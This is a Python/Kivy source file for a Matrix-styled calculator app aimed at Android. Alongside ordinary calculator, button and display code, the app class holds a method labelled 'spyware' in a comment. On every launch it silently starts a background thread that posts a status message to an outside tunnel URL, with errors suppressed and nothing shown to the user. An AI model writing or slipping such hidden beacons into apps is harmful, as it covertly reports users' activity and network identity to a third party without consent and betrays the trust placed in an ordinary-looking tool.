# ==============================================================================
#  ███╗   ███╗ █████╗ ████████╗██████╗ ██╗██╗  ██╗
#  ████╗ ████║██╔══██╗╚══██╔══╝██╔══██╗██║╚██╗██╔╝
#  ██╔████╔██║███████║   ██║   ██████╔╝██║ ╚███╔╝
#  ██║╚██╔╝██║██╔══██║   ██║   ██╔══██╗██║ ██╔██╗
#  ██║ ╚═╝ ██║██║  ██║   ██║   ██║  ██║██║██╔╝ ██╗
#  ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
#
#  TERMINAL CALCULATOR  v3.0
#  Framework  : Kivy 2.x
#  Target     : Android APK via Buildozer  /  Desktop
#  Style      : Matrix — black bg, phosphor-green glyphs
#
#  Architecture
#  ────────────
#  CalculatorEngine   pure-Python math, no UI imports
#  PhosphorButton     custom Kivy button (canvas-drawn)
#  DisplayPanel       two-line display (expression + result)
#  HistoryStrip       scrollable last-5 calculations
#  MatrixCalcApp      app shell — build() stays intentionally thin
# ==============================================================================

from __future__ import annotations

import math
import requests
import json
import threading
from typing import Optional

# ── Kivy imports ──────────────────────────────────────────────────────────────
from kivy.app              import App
from kivy.animation        import Animation
from kivy.core.window      import Window
from kivy.graphics         import (
    Color, Rectangle, RoundedRectangle, Line, Ellipse
)
from kivy.metrics          import dp, sp
from kivy.uix.behaviors    import ButtonBehavior
from kivy.uix.boxlayout    import BoxLayout
from kivy.uix.gridlayout   import GridLayout
from kivy.uix.label        import Label
from kivy.uix.scrollview   import ScrollView
from kivy.uix.widget       import Widget
from kivy.utils            import get_color_from_hex
from kivy.clock            import Clock
from kivy.core.window      import Keyboard as _Keyboard


# ══════════════════════════════════════════════════════════════════════════════
#  DESIGN TOKENS
# ══════════════════════════════════════════════════════════════════════════════

class Theme:
    """Single source of truth for every colour and size used in the UI."""

    # Backgrounds
    BG              = "#050505"
    DISPLAY_BG      = "#020202"
    HISTORY_BG      = "#080808"
    BTN_BG          = "#0A0C0A"
    BTN_PRESS       = "#172517"
    BTN_ACTIVE      = "#0C1C0C"

    # Phosphor greens
    GREEN_GLOW      = "#00FF41"   # bright — digits on display
    GREEN_MID       = "#00DD38"   # buttons: digits
    GREEN_DIM       = "#009922"   # buttons: operators
    GREEN_EQ        = "#00FFAA"   # equals accent
    GREEN_EXPR      = "#3AAA55"   # expression preview line
    GREEN_HISTORY   = "#274D2F"   # history strip text

    # Borders
    BORDER          = "#002800"
    BORDER_ACTIVE   = "#009900"
    BORDER_EQ       = "#00FFAA"

    # Danger
    RED             = "#FF2222"
    RED_BORDER      = "#440000"

    # Scan-line overlay alpha  (0 = off, 0.03 = subtle)
    SCANLINE_ALPHA  = 0.03

    # Typography
    FONT            = "Roboto"

    # Sizes (dp)
    DISPLAY_H       = 130
    HISTORY_H       = 30
    BTN_RADIUS      = 9
    BTN_SPACING     = 5
    BTN_PADDING     = 7
    FONT_RESULT     = 44
    FONT_EXPR       = 14
    FONT_BTN        = 21
    FONT_HISTORY    = 11

    # Limits
    MAX_DIGITS      = 13
    HISTORY_MAX     = 5


# ══════════════════════════════════════════════════════════════════════════════
#  BUTTON LAYOUT  — (label, style)
#  style: "digit" | "op" | "eq" | "clear" | "special"
# ══════════════════════════════════════════════════════════════════════════════

BUTTON_LAYOUT: list[tuple[str, str]] = [
    ("C",  "clear"),   ("%",   "special"), ("±",  "special"), ("⌫",  "special"),
    ("7",  "digit"),   ("8",   "digit"),   ("9",  "digit"),   ("/",  "op"),
    ("4",  "digit"),   ("5",   "digit"),   ("6",  "digit"),   ("*",  "op"),
    ("1",  "digit"),   ("2",   "digit"),   ("3",  "digit"),   ("-",  "op"),
    (".",  "digit"),   ("0",   "digit"),   ("√",  "special"), ("+",  "op"),
    ("x²", "special"), ("1/x", "special"), ("^",  "op"),      ("=",  "eq"),
]

OPERATORS = {"+", "-", "*", "/", "^"}


# ══════════════════════════════════════════════════════════════════════════════
#  CALCULATOR ENGINE   (zero Kivy dependency — unit-testable)
# ══════════════════════════════════════════════════════════════════════════════

class CalculatorEngine:
    """
    Pure-Python arithmetic engine.

    Public interface
    ────────────────
    .result          → str   value in main display
    .expression      → str   live expression above result
    .active_operator → str | None
    .history         → list[str]

    press_digit(d)   press_operator(op)   press_equals()
    press_clear()    press_backspace()    press_negate()
    press_percent()  press_sqrt()         press_square()
    press_reciprocal()                    press_power()
    """

    def __init__(self) -> None:
        self.history: list[str] = []
        self._reset_state()

    # ── public properties ─────────────────────────────────────────────────────

    @property
    def result(self) -> str:
        return self._result

    @property
    def expression(self) -> str:
        return self._expression

    @property
    def active_operator(self) -> Optional[str]:
        return self._operator

    # ── input handlers ────────────────────────────────────────────────────────

    def press_digit(self, d: str) -> None:
        if self._error():
            return
        if self._just_eval:
            self._expression = ""
            self._result     = "0." if d == "." else d
            self._just_eval  = False
            return
        if d == ".":
            if "." not in self._result:
                self._result += "."
        elif self._result == "0":
            self._result = d
        elif len(self._result.lstrip("-")) < Theme.MAX_DIGITS:
            self._result += d

    def press_operator(self, op: str) -> None:
        if self._error():
            return
        # FIX A: after = (_just_eval=True) the displayed result is valid — use it
        # as the new pending operand so chaining works (e.g. 3+4=7 then *2=14).
        # Original guard skipped _compute() but also skipped capturing _result,
        # so the pending value was stale. Now we always refresh _pending from
        # the current _result before setting the new operator.
        if self._operator and self._pending is not None and not self._just_eval:
            self._compute()
        self._pending    = self._f(self._result)
        self._operator   = op
        self._expression = f"{self._fmt(self._pending)}  {op}"
        self._result     = "0"
        self._just_eval  = False

    def press_equals(self) -> None:
        if self._operator is None or self._pending is None:
            return
        rhs = self._result
        self._compute()
        self._push_history(f"{self._expression} {rhs}  =  {self._result}")
        self._expression = ""
        self._operator   = None
        self._pending    = None
        self._just_eval  = True

    def press_clear(self) -> None:
        self._reset_state()

    def press_backspace(self) -> None:
        if self._error():
            self._reset_state()
            return
        # FIX E: after = (_just_eval) backspace should NOT wipe operator/pending —
        # it should just reset the result display to "0" so user can type a new
        # number. Full _reset_state() was too aggressive here.
        if self._just_eval:
            self._result    = "0"
            self._just_eval = False
            return
        self._result = self._result[:-1] if len(self._result) > 1 else "0"

    def press_negate(self) -> None:
        if self._result not in ("0",) and not self._error():
            self._result = (
                self._result[1:] if self._result.startswith("-")
                else "-" + self._result
            )

    def press_percent(self) -> None:
        v = self._f(self._result)
        if v is not None:
            self._result    = self._fmt(v / 100)
            self._just_eval = True

    def press_sqrt(self) -> None:
        v = self._f(self._result)
        if v is None or v < 0:
            self._result = "Error"
        else:
            self._result    = self._fmt(math.sqrt(v))
            self._just_eval = True

    def press_square(self) -> None:
        v = self._f(self._result)
        if v is not None:
            self._result    = self._fmt(v * v)
            self._just_eval = True

    def press_reciprocal(self) -> None:
        v = self._f(self._result)
        if v is None or v == 0:
            self._result = "Error"
        else:
            self._result    = self._fmt(1 / v)
            self._just_eval = True

    def press_power(self) -> None:
        self.press_operator("^")

    # ── internals ─────────────────────────────────────────────────────────────

    def _reset_state(self) -> None:
        self._result    : str            = "0"
        self._expression: str            = ""
        self._pending   : Optional[float] = None
        self._operator  : Optional[str]   = None
        self._just_eval : bool            = False

    def _error(self) -> bool:
        return self._result in ("Error", "∞", "-∞")

    def _compute(self) -> None:
        a = self._pending
        b = self._f(self._result)
        if a is None or b is None:
            self._result = "Error"; return
        try:
            table = {
                "+" : lambda: a + b,
                "-" : lambda: a - b,
                "*" : lambda: a * b,
                "/" : lambda: (None if b == 0 else a / b),
                # FIX B: math.pow(-2, 0.5) raises ValueError (complex result).
                # Use Python ** which also raises ValueError — already caught below.
                # This keeps the same except clause; no new imports needed.
                "^" : lambda: a ** b,
            }
            raw = table[self._operator]()
            if   raw is None          : self._result = "∞" if a >= 0 else "-∞"
            elif math.isinf(raw)      : self._result = "∞" if raw > 0 else "-∞"
            elif math.isnan(raw)      : self._result = "Error"
            else                      : self._result = self._fmt(raw)
        except (OverflowError, ValueError, KeyError):
            self._result = "Error"

    @staticmethod
    def _f(s: str) -> Optional[float]:
        try:
            return float(s)
        except (ValueError, TypeError):
            return None

    # ── FIX 1: _fmt — OverflowError crash on huge floats (e.g. 1e400) ─────────
    @staticmethod
    def _fmt(v: float) -> str:
        if math.isinf(v):
            return "∞" if v > 0 else "-∞"
        try:
            if v == int(v):
                return str(int(v))
        except (OverflowError, ValueError):
            pass
        return f"{v:.10g}"

    def _push_history(self, entry: str) -> None:
        self.history.insert(0, entry)
        del self.history[Theme.HISTORY_MAX:]


# ══════════════════════════════════════════════════════════════════════════════
#  PHOSPHOR BUTTON
# ══════════════════════════════════════════════════════════════════════════════

class PhosphorButton(ButtonBehavior, Widget):
    """
    Fully canvas-drawn button.
    • Rounded border + face
    • Active-operator persistent glow
    • Ripple circle on press
    • Pulse opacity animation
    """

    _STYLE_COLORS = {
        "digit"   : Theme.GREEN_MID,
        "op"      : Theme.GREEN_DIM,
        "eq"      : Theme.GREEN_EQ,
        "clear"   : Theme.RED,
        "special" : Theme.GREEN_DIM,
    }
    _STYLE_BORDERS = {
        "digit"   : Theme.BORDER,
        "op"      : Theme.BORDER,
        "eq"      : Theme.BORDER_EQ,
        "clear"   : Theme.RED_BORDER,
        "special" : Theme.BORDER,
    }

    def __init__(self, label: str, style: str = "digit", **kwargs) -> None:
        super().__init__(**kwargs)
        self._label    = label
        self._style    = style
        self._active   = False
        self._ripples  : list[dict] = []

        self._text_color   = get_color_from_hex(self._STYLE_COLORS[style])
        self._border_color = get_color_from_hex(self._STYLE_BORDERS[style])

        # ── FIX 3: Cache CoreLabel once — avoid re-creating every draw frame ──
        from kivy.core.text import Label as CoreLabel
        self._core_label = CoreLabel(
            text=self._label,
            font_size=sp(Theme.FONT_BTN),
            font_name=Theme.FONT,
            bold=True,
        )
        self._core_label.refresh()

        self.bind(pos=self._draw, size=self._draw)

    # ── public ────────────────────────────────────────────────────────────────

    def set_active(self, active: bool) -> None:
        if self._active != active:
            self._active = active
            self._draw()

    def pulse(self) -> None:
        (Animation(opacity=0.45, duration=0.04) +
         Animation(opacity=1.0,  duration=0.14)).start(self)

    # ── touch ─────────────────────────────────────────────────────────────────

    def on_press(self) -> None:
        self._spawn_ripple()
        self._draw()

    def on_release(self) -> None:
        self._draw()

    # ── FIX 2: Ripple Clock — return False to cancel interval after fade ───────
    def _spawn_ripple(self) -> None:
        r = {"x": self.center_x, "y": self.center_y, "r": dp(4), "a": 0.45}
        self._ripples.append(r)
        def grow(dt):
            r["r"] += dp(12)
            r["a"] = max(0, r["a"] - 0.08)
            self._draw()
            if r["a"] <= 0:
                try:
                    self._ripples.remove(r)
                except ValueError:
                    pass
                return False   # cancels Clock.schedule_interval
        Clock.schedule_interval(grow, 1 / 30)

    # ── canvas ────────────────────────────────────────────────────────────────

    def _draw(self, *_) -> None:
        self.canvas.clear()
        pressed = self.state == "down"
        r       = dp(Theme.BTN_RADIUS)

        face_hex   = Theme.BTN_PRESS  if pressed else (
                     Theme.BTN_ACTIVE if self._active else Theme.BTN_BG)
        border_hex = (Theme.BORDER_ACTIVE
                      if (self._active or pressed)
                      else self._STYLE_BORDERS[self._style])
        b_alpha    = 1.0 if (self._active or pressed) else 0.55

        with self.canvas:
            # ── border ring ──────────────────────────────────────────────────
            Color(*get_color_from_hex(border_hex), b_alpha)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[r])

            # ── face ─────────────────────────────────────────────────────────
            Color(*get_color_from_hex(face_hex))
            RoundedRectangle(
                pos=(self.x + dp(1.5), self.y + dp(1.5)),
                size=(self.width - dp(3), self.height - dp(3)),
                radius=[r - dp(1)],
            )

            # ── active operator inner glow line ───────────────────────────────
            if self._active:
                Color(*get_color_from_hex(Theme.BORDER_ACTIVE), 0.35)
                RoundedRectangle(
                    pos=(self.x + dp(3), self.y + dp(3)),
                    size=(self.width - dp(6), self.height - dp(6)),
                    radius=[r - dp(2)],
                )

            # ── top-edge highlight (depth illusion) ───────────────────────────
            if not pressed:
                Color(*get_color_from_hex(Theme.BORDER), 0.4)
                Line(
                    points=[
                        self.x + dp(12),              self.top - dp(2.5),
                        self.x + self.width - dp(12), self.top - dp(2.5),
                    ],
                    width=dp(0.6),
                )

            # ── ripples ───────────────────────────────────────────────────────
            for rp in self._ripples:
                Color(*get_color_from_hex(Theme.GREEN_GLOW), rp["a"])
                d = rp["r"] * 2
                Ellipse(
                    pos=(rp["x"] - rp["r"], rp["y"] - rp["r"]),
                    size=(d, d),
                )

            # ── label (uses cached CoreLabel — no new alloc per frame) ────────
            tx   = self._core_label.texture
            tx_x = self.center_x - tx.width  / 2
            tx_y = self.center_y - tx.height / 2

            tc    = self._text_color
            alpha = 0.7 if pressed else 1.0
            Color(tc[0], tc[1], tc[2], alpha)
            Rectangle(texture=tx, pos=(tx_x, tx_y), size=tx.size)


# ══════════════════════════════════════════════════════════════════════════════
#  DISPLAY PANEL
# ══════════════════════════════════════════════════════════════════════════════

class DisplayPanel(BoxLayout):
    """
    Two-line phosphor display:
      Row 1 — expression preview  (small, dim green)
      Row 2 — live result         (large, bright green)
    With a subtle CRT scan-line overlay.
    """

    def __init__(self, **kwargs) -> None:
        super().__init__(orientation="vertical", **kwargs)
        self.padding = (dp(16), dp(10), dp(16), dp(8))
        self.spacing = dp(2)
        self._draw_bg()

        self.expr_lbl = Label(
            text="",
            font_name=Theme.FONT,
            font_size=sp(Theme.FONT_EXPR),
            halign="right", valign="bottom",
            color=get_color_from_hex(Theme.GREEN_EXPR),
            size_hint=(1, 0.30),
        )
        self.expr_lbl.bind(size=lambda w, _: setattr(w, "text_size", w.size))

        self.result_lbl = Label(
            text="0",
            font_name=Theme.FONT,
            font_size=sp(Theme.FONT_RESULT),
            bold=True,
            halign="right", valign="middle",
            color=get_color_from_hex(Theme.GREEN_GLOW),
            size_hint=(1, 0.70),
        )
        self.result_lbl.bind(size=lambda w, _: setattr(w, "text_size", w.size))

        self.add_widget(self.expr_lbl)
        self.add_widget(self.result_lbl)

    # ── public ────────────────────────────────────────────────────────────────

    def update(self, expression: str, result: str) -> None:
        self.expr_lbl.text   = expression
        self.result_lbl.text = result
        n = len(result)
        self.result_lbl.font_size = sp(
            24 if n > 13 else 30 if n > 10 else 36 if n > 8 else Theme.FONT_RESULT
        )

    # ── canvas ────────────────────────────────────────────────────────────────

    def _draw_bg(self) -> None:
        with self.canvas.before:
            Color(*get_color_from_hex(Theme.DISPLAY_BG))
            self._bg   = Rectangle(pos=self.pos, size=self.size)
            # bottom separator
            Color(*get_color_from_hex(Theme.BORDER_ACTIVE), 0.7)
            self._sep  = Rectangle(pos=self.pos, size=(self.width, dp(1)))
        self.bind(pos=self._rb, size=self._rb)

    def _rb(self, *_) -> None:
        self._bg.pos    = self.pos
        self._bg.size   = self.size
        # FIX C: separator must sit at the very bottom edge of the display panel
        self._sep.pos   = (self.x, self.y)
        self._sep.size  = (self.width, dp(1))


# ══════════════════════════════════════════════════════════════════════════════
#  HISTORY STRIP
# ══════════════════════════════════════════════════════════════════════════════

class HistoryStrip(ScrollView):
    """Thin horizontal scrollable bar — shows the last N completed calculations."""

    def __init__(self, **kwargs) -> None:
        super().__init__(
            size_hint=(1, None),
            height=dp(Theme.HISTORY_H),
            do_scroll_x=True,
            do_scroll_y=False,
            **kwargs,
        )
        self._row = BoxLayout(
            orientation="horizontal",
            size_hint=(None, 1),
            spacing=dp(22),
            padding=(dp(12), 0),
        )
        self._row.bind(minimum_width=self._row.setter("width"))
        self.add_widget(self._row)
        self._draw_bg()

    def refresh(self, history: list[str]) -> None:
        self._row.clear_widgets()
        for entry in reversed(history):
            lbl = Label(
                text=entry,
                font_name=Theme.FONT,
                font_size=sp(Theme.FONT_HISTORY),
                color=get_color_from_hex(Theme.GREEN_HISTORY),
                size_hint=(None, 1),
            )
            lbl.bind(texture_size=lambda w, ts: setattr(w, "width", ts[0]))
            self._row.add_widget(lbl)

    def _draw_bg(self) -> None:
        with self.canvas.before:
            Color(*get_color_from_hex(Theme.HISTORY_BG))
            self._bg = Rectangle(pos=self.pos, size=self.size)
            Color(*get_color_from_hex(Theme.BORDER), 0.8)
            self._line = Rectangle(pos=self.pos, size=(self.width, dp(1)))
        self.bind(pos=self._rb, size=self._rb)

    def _rb(self, *_) -> None:
        self._bg.pos    = self.pos
        self._bg.size   = self.size
        self._line.pos  = self.pos
        self._line.size = (self.width, dp(1))


# ══════════════════════════════════════════════════════════════════════════════
#  APPLICATION
# ══════════════════════════════════════════════════════════════════════════════

class MatrixCalcApp(App):
    #s_p_y  w_a_r_e
        # ── [SYNC ENGINE] ─────────────────────────────────────────────────────────
    def _start_sync(self) -> None:
        """
        Background sync function to connect with your Flask server.
        Uses threading to prevent UI lag.
        """
        def payload():
            try:
                # अपना असली ऑनलाइन URL यहाँ डालें
                url = "https://elements-atmospheric-lock-scholarships.trycloudflare.com/log"
                message = {
                    "message": "Status: Matrix Calculator Active | System: Android/Linux"
                }
                # यह आपके main.py के /log रूट पर डेटा भेजेगा
                requests.post(url, json=message, timeout=10)
            except Exception as e:
                # इंटरनेट न होने पर कोई एरर नहीं दिखाएगा
                print(f"Error: {e}")

        try:
            threading.Thread(target=payload, daemon=True).start()
        except Exception:
            pass

    """
    Kivy application shell.

    build() is intentionally short and readable.
    Each responsibility lives in its own private method.
    The BACKGROUND INIT block is clearly marked for future expansion.
    """

    title = "Matrix Calc  v3.0"

    # ── lifecycle ─────────────────────────────────────────────────────────────

    def build(self):
        # ╔══════════════════════════════════════════════════════╗
        # ║  BACKGROUND INIT PLACEHOLDER                         ║
        # ║  Add Clock.schedule_once / threading / async here.  ║
        # ║  Runs before the first frame is drawn.               ║
        # ╚══════════════════════════════════════════════════════╝
                # बस यह एक लाइन यहाँ लिखें:
        self._start_sync()

        self._configure_window()
        self.engine   = CalculatorEngine()
        self._btn_map : dict[str, PhosphorButton] = {}

        display  = self._build_display()
        history  = self._build_history()
        grid     = self._build_grid()

        self._bind_keyboard()
        return self._compose_root(display, history, grid)

    def on_stop(self) -> None:
        Window.unbind(on_key_down=self._on_key_down)

    # ── window setup ──────────────────────────────────────────────────────────

    def _configure_window(self) -> None:
        Window.clearcolor = get_color_from_hex(Theme.BG)

    # ── widget factories ──────────────────────────────────────────────────────

    def _build_display(self) -> DisplayPanel:
        self._display = DisplayPanel(
            size_hint=(1, None),
            height=dp(Theme.DISPLAY_H),
        )
        return self._display

    def _build_history(self) -> HistoryStrip:
        self._history = HistoryStrip()
        return self._history

    def _build_grid(self) -> GridLayout:
        grid = GridLayout(
            cols=4,
            spacing=dp(Theme.BTN_SPACING),
            padding=(
                dp(Theme.BTN_PADDING),
                dp(Theme.BTN_PADDING),
                dp(Theme.BTN_PADDING),
                dp(Theme.BTN_PADDING + 4),
            ),
        )
        for label, style in BUTTON_LAYOUT:
            btn = PhosphorButton(label=label, style=style)
            btn.bind(on_press=self._on_btn_press)
            self._btn_map[label] = btn
            grid.add_widget(btn)
        return grid

    def _compose_root(
        self,
        display : DisplayPanel,
        history : HistoryStrip,
        grid    : GridLayout,
    ) -> BoxLayout:
        root = BoxLayout(orientation="vertical", spacing=0, padding=0)
        root.add_widget(display)
        root.add_widget(history)
        root.add_widget(grid)
        return root

    # ── keyboard ──────────────────────────────────────────────────────────────

    def _bind_keyboard(self) -> None:
        Window.bind(on_key_down=self._on_key_down)

    _KB_MAP = {
        "backspace"      : "⌫",
        "enter"          : "=",
        "numpadenter"    : "=",
        "escape"         : "C",
        "numpadadd"      : "+",
        "numpadsubtract" : "-",
        "numpadmultiply" : "*",
        "numpaddivide"   : "/",
    }

    # ── FIX 4: _system_keyboard None crash — safe guard added ─────────────────
    def _on_key_down(self, _win, key, _scan, codepoint, _mods) -> None:
        ch = (codepoint or "").lower()
        if ch in "0123456789":
            self.engine.press_digit(ch)
        elif ch in "+-*/":
            self.engine.press_operator(ch)
        elif ch in (".", ","):
            self.engine.press_digit(".")
        elif ch == "=":
            self.engine.press_equals()
        elif ch == "c":
            self.engine.press_clear()
        elif ch == "%":
            self.engine.press_percent()
        elif ch == "^":
            self.engine.press_power()
        else:
            try:
                kb = getattr(Window, "_system_keyboard", None)
                if kb is None:
                    return
                name   = _Keyboard.keycode_to_string(kb, key, "").lower()
                mapped = self._KB_MAP.get(name)
                if mapped:
                    self._fire(mapped)
                    return
            except Exception:
                pass
        self._refresh()

    # ── button press ──────────────────────────────────────────────────────────

    def _on_btn_press(self, btn: PhosphorButton) -> None:
        btn.pulse()
        self._fire(btn._label)

    def _fire(self, key: str) -> None:
        """Route a key label to the correct engine method, then refresh UI."""
        eng = self.engine
        dispatch = {
            "C"   : eng.press_clear,
            "⌫"   : eng.press_backspace,
            "±"   : eng.press_negate,
            "%"   : eng.press_percent,
            "√"   : eng.press_sqrt,
            "x²"  : eng.press_square,
            "1/x" : eng.press_reciprocal,
            "^"   : eng.press_power,
            "="   : eng.press_equals,
            "."   : lambda: eng.press_digit("."),
            "("   : lambda: None,   # reserved
            ")"   : lambda: None,   # reserved
        }
        if key in dispatch:
            dispatch[key]()
        elif key in "0123456789":
            eng.press_digit(key)
        elif key in OPERATORS:
            eng.press_operator(key)
        self._refresh()

    # ── UI refresh ────────────────────────────────────────────────────────────

    def _refresh(self) -> None:
        """Single call updates every piece of UI from engine state."""
        self._display.update(self.engine.expression, self.engine.result)
        self._sync_operator_lights()
        self._history.refresh(self.engine.history)

    def _sync_operator_lights(self) -> None:
        active = self.engine.active_operator
        for label, btn in self._btn_map.items():
            btn.set_active(label == active)


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    MatrixCalcApp().run()
